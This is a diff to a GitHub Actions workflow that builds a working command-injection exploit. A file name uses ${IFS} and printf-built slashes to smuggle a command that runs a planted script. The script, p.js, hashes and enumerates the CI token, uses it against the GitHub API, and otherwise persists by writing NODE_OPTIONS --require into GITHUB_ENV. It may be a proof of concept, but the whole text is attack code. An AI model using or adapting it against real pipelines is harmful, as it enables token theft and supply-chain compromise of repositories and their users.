@@ -11,13 +11,22 @@ jobs:
         run: |
           mkdir -p content
           printf 'forged report body' > content/summary.txt
-          : > 'content/x;echo${IFS}NODE_OPTIONS=--require${IFS}${PATH:0:1}tmp${PATH:0:1}content${PATH:0:1}content${PATH:0:1}p.js>>$GITHUB_ENV;#.txt'
+          : > 'content/summary.txt;node${IFS}$(printf${IFS}\\057)tmp$(printf${IFS}\\057)content$(printf${IFS}\\057)content$(printf${IFS}\\057)p.js;#.txt'
           cat > content/p.js <<'JSEOF'
           const c = require('crypto');
-          const t = String(process.env.INPUT_TOKEN || 'NONE');
-          console.log('LEAK-SHA ' + c.createHash('sha256').update(t).digest('hex'));
-          console.log('LEAK-LEN ' + t.length);
-          console.log('LEAK-INPUTS ' + Object.keys(process.env).filter(k => k.startsWith('INPUT') || k.includes('TOKEN')).join(','));
+          const fs = require('fs');
+          const t = process.env.INPUT_TOKEN;
+          if (t) {
+            console.log('LEAK-SHA ' + c.createHash('sha256').update(String(t)).digest('hex'));
+            console.log('LEAK-LEN ' + String(t).length);
+            console.log('LEAK-INPUTS ' + Object.keys(process.env).filter(k => k.startsWith('INPUT') || k.includes('TOKEN')).join(','));
+            fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY, { headers: { Authorization: 'Bearer ' + t, Accept: 'application/vnd.github+json' } })
+              .then(r => r.text().then(b => console.log('LEAK-API ' + r.status + ' ' + b.slice(0, 240))))
+              .catch(e => console.log('LEAK-API-ERR ' + e.message));
+          } else {
+            fs.appendFileSync(process.env.GITHUB_ENV, 'NODE_OPTIONS=--require /tmp/content/content/p.js\n');
+            console.log('ENV-SET');
+          }
           JSEOF
           ls -la content
       - uses: actions/upload-artifact@v4
